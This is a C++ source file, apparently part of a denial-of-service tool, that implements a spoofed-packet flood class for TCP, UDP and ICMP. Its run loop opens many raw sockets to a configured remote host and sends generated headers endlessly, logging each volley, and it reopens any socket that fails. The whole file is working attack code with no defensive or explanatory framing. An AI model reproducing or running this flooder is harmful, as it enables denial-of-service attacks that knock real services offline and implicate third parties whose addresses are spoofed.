#include "base_spoofed_flood.h"
#include "utils.h"

#include <vector>

#include <spdlog/spdlog.h>

base_spoofed_flood::base_spoofed_flood(std::shared_ptr<Config> config,
                                       int protocol)
    : Vector(std::move(config)), proto{protocol} {
  hdr_len = [&]() {
    switch (proto) {
    case IPPROTO_TCP:
    case IPPROTO_UDP:
      return 8192;
    case IPPROTO_ICMP:
      return 400;
    default:
      spdlog::get("logger")->error("protocol not found");
      exit(EXIT_FAILURE);
    }
  }();
}

void base_spoofed_flood::run() {
  std::vector<std::unique_ptr<Rsocket>> sockets{};
  init_sockets(sockets);
  char *hdr = nullptr;
  while (true) {
    for (auto &socket : sockets) {
      if (!socket->Alive())
        socket->Open();
      hdr = gen_hdr(socket->GetDst(), hdr_len);
      if (socket->Write(hdr, hdr_len) == -1) {
        socket->Close();
        socket->Open();
      }
      spdlog::get("logger")->info("Voly Sent");
      delete[] hdr;
    }
    utils::pause(config->time);
  }
}

void base_spoofed_flood::init_sockets(
    std::vector<std::unique_ptr<Rsocket>> &sockets) {
  sockets.reserve(config->conn);
  if (config->tls)
    spdlog::get("logger")->error("tls is not available on spoofed packets");

  if (proto == IPPROTO_ICMP && config->rand_lport)
    spdlog::get("logger")->error(
        "local port randomization is not available on icmp");

  for (int i = 0; i < config->conn; ++i)
    sockets.emplace_back(std::unique_ptr<Rsocket>(
        new Rsocket(config->rhost, config->rport, proto)));
}
